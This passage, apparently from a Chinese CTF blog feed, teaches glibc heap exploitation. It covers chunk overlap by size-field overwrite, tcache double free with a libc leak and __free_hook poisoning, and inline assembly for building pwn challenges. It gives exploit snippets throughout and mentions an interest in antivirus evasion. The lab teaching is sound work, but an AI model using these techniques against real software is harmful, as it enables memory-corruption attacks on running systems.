src="https://pic.imgdb.cn/item/63ff0c72f144a01007ba0762.png"></a></p><p>所以此时用来覆盖chunk2的size域的数值应为0x51</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)+<span class="string">b&#x27;\x51&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure><p>此时chunk2就和chunk3合并了</p><p><a href="https://pic.imgdb.cn/item/63ff0d0ff144a01007bb11d4.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63ff0d0ff144a01007bb11d4.png"></a></p><p>此时chunk2的指针指向的仍然是chunk2的首地址 但是plmalloc已经误判了chunk2  原本其是一个0x31大小的chunk 此时plmalloc误判其还包含了chunk3 所以释放chunk2就会一并释放chunk3</p><p><a href="https://pic.imgdb.cn/item/63ff0d8ff144a01007bc32dd.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63ff0d8ff144a01007bc32dd.png"></a></p><p>可以看到一并放入了tcache 这里之所以没有和top chunk合并 是因为tcache中的chunk  Inuse位仍然为1</p><p>此时我们申请一个0x40大小的chunk 就可以获得原本chunk3的空间 从而对chunk3的内容进行任意修改</p><p>此外还有一种情况 如果chunk2先被释放进入tcachebin后再更改size域会发生什么呢</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)+p64(<span class="number">0x441</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure><p>此时注意 chunk2不能位于fastbin或者是tcachebin中  如果位于二者中 下一个chunk的Inuse位就不会为0 这样就不会合并</p><p>gdb动调看一下是否合并成功</p><p><a href="https://pic.imgdb.cn/item/63ff1440f144a01007c707e8.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63ff1440f144a01007c707e8.png"></a></p><h3 id="环境-ubuntu16-二进制依赖libc2-23"><a href="#环境-ubuntu16-二进制依赖libc2-23" class="headerlink" title="环境: ubuntu16 二进制依赖libc2.23"></a>环境: ubuntu16 二进制依赖libc2.23</h3><p>这类的利用手法被称为overpadding</p><p>你可以理解为反方向的合并 刚才是由chunk2吞并chunk3 修改的是chunk2的size域 现在我们来修改chunk3的prev_size域和size域 从而使得chunk2合并chunk3</p><p>这里的知识点其实和unlink有点相似 unlink也是通过构造fake chunk 伪造好next chunk的prev_size和size</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment">#3</span></span><br></pre></td></tr></table></figure><p>首先申请四个chunk 前三个用来负责合并  第四个用来保证不和top chunk合并</p><p>我们以chunk1来为堆溢出的起点 覆盖chunk2的prev_size和size域 不过在此之前还需要先释放chunk0到unsortedbin中(只要不是fastbin和tcachebin就可以) 这样才能使得后面的合并生效</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x10</span>)+p64(<span class="number">0xb0</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure><p>注意一下chunk2的size域  Inuse位一定要为0 否则不会合并</p><p>此时我们释放chunk2 来看看是否合并成功</p><p><a href="https://pic.imgdb.cn/item/63ff1bccf144a01007d27839.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63ff1bccf144a01007d27839.png"></a></p><p>这种一般是伴随堆块先申请的情况可以利用  从而获取到低地址处堆块任意写的机会</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内联汇编对于pwn出题的一些心得</title>
      <link href="/2023/02/27/%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96%E5%AF%B9%E4%BA%8Epwn%E5%87%BA%E9%A2%98%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BF%83%E5%BE%97/"/>
      <url>/2023/02/27/%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96%E5%AF%B9%E4%BA%8Epwn%E5%87%BA%E9%A2%98%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BF%83%E5%BE%97/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>如果只运用c语言进行编写pwn题目 对于一些寄存器或者栈结构一类的没有办法操控</p><p>这时候利用内联汇编就可以巧妙的解决问题的所在</p><p>同时由于我想学习免杀 其中有一种利用方法为内联汇编花指令 刚好可以利用这个来打基础</p><p>本文会伴随着本人对于内联汇编的不断学习而更新 不全面也不严谨 仅供参考</p><h2 id="内联函数"><a href="#内联函数" class="headerlink" title="内联函数"></a>内联函数</h2><p>在编写c语言时 如果你在一个函数中调用另外一个函数 其是通过call指令来进行跳转 跳转到对应函数的地址开始执行函数内容<br>最后通过存储在bp寄存器中的原函数地址来返回<br>比如下面这个程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">      test();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其汇编形式如下图所示</p><p><a href="https://pic.imgdb.cn/item/63fde470f144a010070ffbdf.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63fde470f144a010070ffbdf.png"></a></p><p>如果是一个循环调用函数 那么就会造成栈空间过于陈杂 这个时候就可以使用内联函数来解决问题</p><p>在对应函数定义时前缀加上inline</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">      test();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时当main函数执行到调用test函数的时候 会直接在当前栈中执行test函数 而非跳转</p><p><a href="https://pic.imgdb.cn/item/63fde6d9f144a01007147330.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63fde6d9f144a01007147330.png"></a></p><p>但是你会发现正常编译会报错未定义的函数 我们需要手动链接</p><p>先将其编译成.o格式的文件 再进行动态链接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -O   -c -o test test.c</span><br><span class="line">gcc   test.o  -lgmp -o test</span><br></pre></td></tr></table></figure><h2 id="内联汇编"><a href="#内联汇编" class="headerlink" title="内联汇编"></a>内联汇编</h2><h3 id="基本内联汇编"><a href="#基本内联汇编" class="headerlink" title="基本内联汇编"></a>基本内联汇编</h3><p>基于上述你对内联函数的认识 那么显然易见 内联汇编就相当于我们直接往对应位置写入汇编代码 这就使得我们拥有了在程序编写的初期就拥有了操控寄存器值的能力 或者是修改栈结构 篡改程序执行流</p><p>对于pwn题来说 常用的编译是基于GCC的 而GCC采用的是AT&amp;T&#x2F;UNIX 汇编语法</p><p>不同的汇编语法对于内联汇编的编写格式要求不一样</p><p>正常的一个汇编语句 比如要使得rax寄存器赋值为1 需要这样编写</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax,1</span><br></pre></td></tr></table></figure><p>而受汇编语法约束的内联汇编需要这样编写</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov $1,%rax</span><br></pre></td></tr></table></figure><p>也就是使得源操作数和目的操作数调换位置</p><p>其中1是属于一个立即操作数 我们需要在其前面添加一个$符号 否则1会被识别为一个地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00001131  488b042501000000   mov     rax, qword [__elf_header.ident.signature[1]]  &#123;0x10102464c45&#125;</span><br></pre></td></tr></table></figure><p>可以看到其被识别为了ELF文件的文件头结构体中的第一个元素的第一个字节</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000  struct Elf64_Header __elf_header = </span><br><span class="line">00000000  &#123;</span><br><span class="line">00000000      struct Elf64_Ident ident = </span><br><span class="line">00000000      &#123;</span><br><span class="line">00000000          char signature[0x4] = &quot;\x7fELF&quot;</span><br><span class="line">00000004          uint8_t file_class = 0x2</span><br><span class="line">00000005          uint8_t encoding = 0x1</span><br><span class="line">00000006          uint8_t version = 0x1</span><br><span class="line">00000007          uint8_t os = 0x0</span><br><span class="line">00000008          uint8_t abi_version = 0x0</span><br><span class="line">00000009          char pad[0x7] = &quot;\x00\x00\x00\x00\x00\x00&quot;, 0</span><br><span class="line">00000010      &#125;</span><br></pre></td></tr></table></figure><p>我们需要使得计算机明白1在这里是一个即时操作数 而非地址 所以需要加上$符号</p><p>至于rax寄存器前面的%符号 是寄存器的固定格式</p><p>同时和常规汇编一致 在操作符后面加上特定字符 可以决定操作数的字节大小 </p><p>诸如’b’ ‘w’ ‘l’</p><p>如果我们想要调用寄存器中的值 可以用括号将寄存器套起来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov (%rbx),%rax</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00001131  488b03             mov     rax, qword [rbx]</span><br></pre></td></tr></table></figure><p>最后 对于每行的汇编语句结束以后 都需要加上’\t\n‘  以此来区分每行汇编 并且每行汇编都需要加上双引号 如下:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="keyword">asm</span>(</span><br><span class="line">            <span class="string">&quot;mov (%rbx),%rax\n\t&quot;</span></span><br><span class="line">      );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="扩展内联汇编"><a href="#扩展内联汇编" class="headerlink" title="扩展内联汇编"></a>扩展内联汇编</h3><p>上述的基本内联汇编 往往只局限于内联汇编中的数据操作 而在扩展形式中</p><p>我们还可以指定操作数 并且可以选择输入输出寄存器 以及指明要修改的寄存器列表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asm ( assembler template</span><br><span class="line">        : output operands                /* optional */</span><br><span class="line">        : input operands                 /* optional */</span><br><span class="line">        : list of clobbered registers    /* optional */</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>上面是扩展内联汇编的基本格式</p><p>第一个冒号后面指定的是输出操作数</p><p>第二个冒号指定的是输入操作数</p><p>第三个冒号解释起来复杂 由于内联汇编是直接插入在我们原本的函数汇编代码中 再加上我们对于寄存器的值进行了操作</p><p>这会对正常函数的执行造成影响  所以我们需要在这里列出损坏的寄存器列表 让系统执行完内联汇编后还原一下寄存器的值 使用memory可以还原所有寄存器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asm (</span><br><span class="line">            &quot;mov %1, %%rax\n\t&quot;</span><br><span class="line">            &quot;mov %%rax, %0\n\t&quot;</span><br><span class="line">            :&quot;=m&quot;(b)        /* output */</span><br><span class="line">            :&quot;m&quot;(a)         /* input */</span><br><span class="line">            :&quot;memory&quot;         /* clobbered register */</span><br><span class="line">      );</span><br></pre></td></tr></table></figure><p>下面我们基于上述的一段扩展内联汇编来帮助分析</p><p>开头的两行汇编属于汇编指令部分 语法问题和基本内联汇编一致 唯一要注意的是第一行的%1是什么</p><p>其代表的是我们引入的输入操作数a 其在整个扩展内联汇编中是第二个变量 也就是说我们想要引用输出变量b 就是%0 所以是从0开始递增的</p><p>接着来看”&#x3D;m” 其中’&#x3D;’是约束修饰符 用来指定其为输出操作数并且是可写的</p><p>‘m’也同为约束符 通常是用来指定这个操作数的存放</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">“a”    将输入变量放入eax</span><br><span class="line">“b”    将输入变量放入ebx</span><br><span class="line">“c”    将输入变量放入ecx</span><br><span class="line">“d”    将输入变量放入edx</span><br><span class="line">“S”    将输入变量放入esi</span><br><span class="line">“D”    将输入变量放入edi</span><br><span class="line">“q”    将输入变量放入eax，ebx ,ecx ，edx中的一个</span><br><span class="line">“r”    将输入变量放入通用寄存器，也就是eax ，ebx，ecx,edx，esi，edi中的一个</span><br><span class="line">“A”    放入eax和edx，把eax和edx，合成一个64位的寄存器(uselong longs)</span><br><span class="line">“m”    内存变量</span><br><span class="line">“o”    操作数为内存变量，但是其寻址方式是偏移量类型，也即是基址寻址，或者是基址加变址寻址</span><br><span class="line">“V”    操作数为内存变量，但寻址方式不是偏移量类型</span><br><span class="line">“,”    操作数为内存变量，但寻址方式为自动增量</span><br><span class="line">“p”    操作数是一个合法的内存地址（指针）</span><br><span class="line">“g”    将输入变量放入eax，ebx，ecx ，edx中的一个或者作为内存变量</span><br><span class="line">“X”    操作数可以是任何类型</span><br><span class="line">“I”    0-31 之间的立即数（用于32位移位指令）</span><br><span class="line">“J”    0-63 之间的立即数（用于64 位移位指令）</span><br><span class="line">“N”    0-255 ，之间的立即数（用于out 指令）</span><br><span class="line">“i”    立即数</span><br><span class="line">“n”    立即数，有些系统不支持除字以外的立即数，这些系统应该使用“n”而不是“i”</span><br><span class="line">“=”    操作数在指令中是只写的（输出操作数）</span><br><span class="line">“+”    操作数在指令中是读写类型的（输入输出操作数）</span><br><span class="line">“f”    浮点数</span><br><span class="line">“t”    第一个浮点寄存器</span><br><span class="line">“u”    第二个浮点寄存器</span><br><span class="line">“G”    标准的80387</span><br><span class="line">%    该操作数可以和下一个操作数交换位置</span><br><span class="line">#    部分注释</span><br><span class="line">*    表示如果选用寄存器，则其后的字母被忽略</span><br><span class="line">“&amp;”    表示输入和输出操作数不能使用相同的寄存器</span><br></pre></td></tr></table></figure><p>对于一个char数组 一般是用’m’来约束 其他的我测试是会报错 同时 只能操作一个字长的数据 超过了就不行了</p><h2 id="运用在pwn中"><a href="#运用在pwn中" class="headerlink" title="运用在pwn中"></a>运用在pwn中</h2><h3 id="泄露libc基址"><a href="#泄露libc基址" class="headerlink" title="泄露libc基址"></a>泄露libc基址</h3><p>这个一般是用来自己方便调试的  这样可以帮助我们快速获取libc基址 </p><p>比如我堆系列的博客用到的示例程序就使用了相同的代码来方便我快速获取libc基址 从而可以在exp中更自由的调试</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> a[<span class="number">0x20</span>];</span><br><span class="line">    read(<span class="number">0</span>,a,<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;pop %rsi\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $1,%rax\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $1,%rdi\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $8,%rdx\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall\n\t&quot;</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>原理就是利用向局部变量a中输入数据 其会被存放在栈上 同时rsp指针指向了输入的数据 这个时候调用pop指令出栈 就成功的把数据传到了寄存器rsi 这个时候调用write函数 就可以直接打印出函数真实地址了</p><h2 id="调整寄存器值"><a href="#调整寄存器值" class="headerlink" title="调整寄存器值"></a>调整寄存器值</h2><p>这个办法比较简单 第一次被我利用是在出canary那一题的时候  用来调整函数结束时寄存器的值 引导解题者手写shellcode 或者进行合理的rop链构造</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">&quot;mov $1,%rax\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;mov %rax,%rdi\n\t&quot;</span></span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>比较简单就不解释了</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> extra </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>tcachebinattack</title>
      <link href="/2023/02/25/tcachebinattack/"/>
      <url>/2023/02/25/tcachebinattack/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>在libc2.26以后 加入了tcachebins 其与fastbin同为单向链表 作用类似于一个缓存区 当用户申请chunk时 优先在tcache中查找 如果无果才进入分配区</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS        64</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_TCACHE_SIZE    tidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> tidx2usize(idx)    (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>tcache的定义如上 简单来说就是一个范围0x10-0x408大小(用户申请大小)的单向链表 一共可以存储64个chunk  每个链表可以存储7个chunk</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 从 tcache list 中获取内存</span><br><span class="line">  if (tc_idx &lt; mp_.tcache_bins // 由 size 计算的 idx 在合法范围内</span><br><span class="line">      /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL) // 该条 tcache 链不为空</span><br><span class="line">    &#123;</span><br><span class="line">      return tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line">#endif</span><br><span class="line">  // 进入与无 tcache 时类似的流程</span><br><span class="line">  if (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">              &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      return victim;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>当用户从tcache中申请内存的时候并非是和fastbin一样通过__int_malloc函数来实现</p><p>而是通过专用的**tcache_get()**函数 其调用优先度高于fastbin 当有合适大小的chunk被申请时 如果tcache满足条件那么优先从tcache中申请</p><h2 id="libc2-26以及老版本的2-27"><a href="#libc2-26以及老版本的2-27" class="headerlink" title="libc2.26以及老版本的2.27"></a>libc2.26以及老版本的2.27</h2><p>tcache最早于2.26诞生 但是2.26的glibc由于是过渡版本 glibc-all-in-one下载不到 我在其他渠道下载到了glibc2.26并没有符号表 所以不好演示 自己尝试编译了glibc但是最后以失败告终 好在2.26和老版本的2.27有着同样的漏洞 所以这里我们一概而论</p><p>这时候的tcache对于double free甚至没有检测 我们直接两次释放同一个chunk 可以看到成功释放进去了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/63fc3f25f144a0100788ea55.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63fc3f25f144a0100788ea55.png"></a></p><p>并且tcachebin对于chunk的取出也没有进行限制</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">main_arena_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;main_arena_addr :&quot;</span>+<span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line">libc_addr = main_arena_addr - (<span class="number">0x7f688abebca0</span>-<span class="number">0x7f688a800000</span>)</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">0x68</span>,p64(free_hook))</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/63fc411af144a010078d44c4.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63fc411af144a010078d44c4.png"></a></p><p>此时已经将free_hook放入到了链表中 我们尝试将其取出</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">main_arena_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;main_arena_addr :&quot;</span>+<span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line">libc_addr = main_arena_addr - (<span class="number">0x7f688abebca0</span>-<span class="number">0x7f688a800000</span>)</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;free_hook :&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">add(<span class="number">0x68</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure><p>并且可以看到 tcache和fastbin不同的在于 其指向的是chunk的用户区首地址</p><p><a href="https://pic.imgdb.cn/item/63fc60b7f144a01007bd6e8c.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63fc60b7f144a01007bd6e8c.png"></a></p><h2 id="高版本2-27"><a href="#高版本2-27" class="headerlink" title="高版本2.27"></a>高版本2.27</h2><p>版本高一点的glibc-2.27引入了对于double free的检查</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">main_arena_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;main_arena_addr :&quot;</span>+<span class="built_in">hex</span>(main_arena_addr))</span><br><span class="line">libc_addr = main_arena_addr - (<span class="number">0x7f688abebca0</span>-<span class="number">0x7f688a800000</span>)</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><p>我们还是和上一题一样 这里直接两次释放chunk0 但是与之不同的是被检测出来了double free</p><p><a href="https://pic.imgdb.cn/item/63fc638cf144a01007c184d0.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63fc638cf144a01007c184d0.png"></a></p><p>那有没有什么可以绕过的办法呢 类似fastbin一样的? 我们来看一下tcache对于double free检查机制的源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span>  <span class="comment">//链表指针，对应chunk中的fd字段</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span>  <span class="comment">//指向所属的tcache结构体，对应chunk中的bk字段</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><p><em>对于每一个tcache都有一个key指针指向</em></p><p><em>借助这个key指针 plmalloc可以更好的对double free进行检查</em></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> tc_idx = csize2tidx(size);<span class="comment">//只要tcache不为空 并且free chunk在tcache范围中 都需要进行double free检查</span></span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span 